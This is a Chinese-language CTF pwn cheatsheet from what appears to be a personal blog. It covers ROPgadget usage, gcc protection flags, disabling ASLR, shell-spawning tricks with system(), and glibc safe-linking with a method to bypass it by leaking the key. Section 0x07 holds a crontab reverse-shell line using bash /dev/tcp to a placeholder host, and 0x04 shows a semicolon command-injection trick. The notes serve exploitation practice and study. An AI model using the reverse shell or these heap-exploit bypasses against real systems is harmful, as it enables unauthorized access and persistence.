---
title: pwn cheatsheet
date: 2022-9-21 20:32:00 +0800
author: sirius
categories: [CTF, pwn]
tags: [CTF, pwn]
math: false
typora-root-url: ../../SiriusHsh.github.io
typora-copy-images-to: ../assets/img/2022
---



# 0x01 ROPgadget命令

`ROPgadget --binary ./elf --string "/bin/sh"`

`ROPgadget --binary ./elf --only "pop|ret" | grep rdi`

# 0x02 gcc编译指定libc版本

`gcc example.c -o example2.23 -Wl,-rpath='./libc-2.23/' -Wl,-dynamic-linker='./libc-2.23/ld-2.23.so'`

# 0x03 gcc安全编译选项

```
CANNARY
gcc -fno-stack-protector -o test test.c  //禁用栈保护
gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
```

```
NX
gcc -o test test.c                  // 默认情况下，开启NX保护
gcc -z execstack -o test test.c     // 禁用NX保护
gcc -z noexecstack -o test test.c   // 开启NX保护
```

```
PIE
gcc -o test test.c -no-pie             // 不开启PIE
gcc -fpie -pie -o test test.c       // 开启PIE，此时强度为1
gcc -fPIE -pie -o test test.c       // 开启PIE，此时为最高强度2
gcc -fpic -o test test.c        // 开启PIC，此时强度为1，不会开启PIE
gcc -fPIC -o test test.c        // 开启PIC，此时为最高强度2，不会开启PIE
```

```
FORTIFY
gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 
gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查(如果检查到缓冲区溢出，就终止程序)
```

```
ASLR
echo 0 > /proc/sys/kernel/randomize_va_space
```

```
RELRO
gcc -o test test.c                      // 默认情况下，是Partial RELRO
gcc -z norelro -o test test.c           // 关闭，即No RELRO
gcc -z lazy -o test test.c              // 部分开启，即Partial RELRO
gcc -z now -o test test.c               // 全部开启，即
```

# 0x04 system("$0") == system("/bin/sh")

system("$0") == system("/bin/sh")



顺便提一下system("aaaaaaaa;sh;bbbbb") 也是等于system("sh") , 分好在shell中就是命令分隔符

system("aaaaaaaa")执行错误，不影响执行后续的system("sh")

https://youtu.be/_ZnnGZygnzE?t=4522



# 0x05 pwndbg中查看状态寄存器

```bash
i r eflags 查看状态寄存器
```



# 0x06 一些汇编指令

1、test与jne、je搭配时，test判断两个操作数是否相同

jne如果不相同则跳转

je如果相同则跳转



2、RAX = 高32位 + EAX

EAX = 高16位 + AX

AX = AH + AL



# 0x07 crontab反弹shell

`* * * * * bash -c "bash -i >& /dev/tcp/ip/port 1>&0"`

crontab常用命令

`crontab -l` 列出当前定时任务

`crontab -e` 编辑定时任务

`crontab file` 从文件中读取定时任务



# 0x08 tcache和largebin大小

64位下 tcache最大放0x410的chunk，largebin从0x400开始



# 0x09 safe-linking加解密与bypass

##加密

![image-20220930000628640](/assets/img/2022/image-20220930000628640.png)

- P为指针本身（也就是原先的fd/next值）， L为指针的地址
  - L >> 12 可以看成是key
  - 也就是原先的fd值 去异或一个 key，得到新的fd值

验证下加密过程：

![image-20220930001151219](/assets/img/2022/image-20220930001151219.png)

图为fastbin链，`chunk2 -> chunk1` ，chunk2原先的fd是chunk1的header=0x555555756510， 现在的加密后的fd是0x0000555000203246

手动计算验证一下：P为原先的fd=0x555555756510，L为指针的地址=0x555555756570

`P' =(0x555555756570 >> 12) ^ 0x555555756510 =0x555000203246  ` ，和图上的一样



##解密

众所周知，异或操作是可逆的

称`L >> 12`为**KEY**

`P' = KEY ^ P`

`P' ^ KEY = (KEY ^ P) ^ KEY = 0 ^ P = P`

也就是说只要把加密后的fd，再异或个`L >> 12` 也就是原先的fd了



##解密的关键

所以说leak出 `L>>12` 是关键

然后你会发现fastbin/tcache的尾节点（意思 `tcache -> chunk3 -> chunk2 -> chunk1`中的chunk1）

它原先的fd是0

根据公式`P' = KEY ^ P`，而P是0， 所以`P'=KEY`，意思尾节点chunk的fd中记录着的就是KEY

只要leak它就能拿到KEY，然后这个加解密就形同虚设了

当然不一定要leak这个KEY，直接leak出堆地址也是可以的，把堆地址右移12也是一样的。

**总结一下解密的关键：**

- L>>12
- 堆地址



## 利用

把伪造的fd 和 KEY 异或一下，填入就可以



## bypass

待补充

https://www.anquanke.com/post/id/206457

https://www.anquanke.com/post/id/207770

**Ref.**

https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/

https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation

https://www.anquanke.com/post/id/206457

https://www.anquanke.com/post/id/207770



# 0x10 glibc 2.32引入的变化

- 引入了safe-linking

- 引入了对tcache和fastbins中申请及释放内存地址的对齐检测，内存地址需要以0x10字节对齐
  - http://blog.nsfocus.net/glibc-234/

修复了

- 原有tcache poisoning、fastbin attack等通过直接覆盖chunk->next指针达到任意地址申请的利用方法

- 由于检测了申请地址是否以0x10对齐，fastbin attack的利用办法受到限制，例如经典的通过错位构造”\x7f”劫持malloc_hook和IO_FILE的利用办法。

待补充

http://blog.nsfocus.net/glibc-234/

**Ref.**

https://medium.com/@b3rm1nG/%E8%81%8A%E8%81%8Aglibc-2-32-malloc%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6-safe-linking-9fb763466773
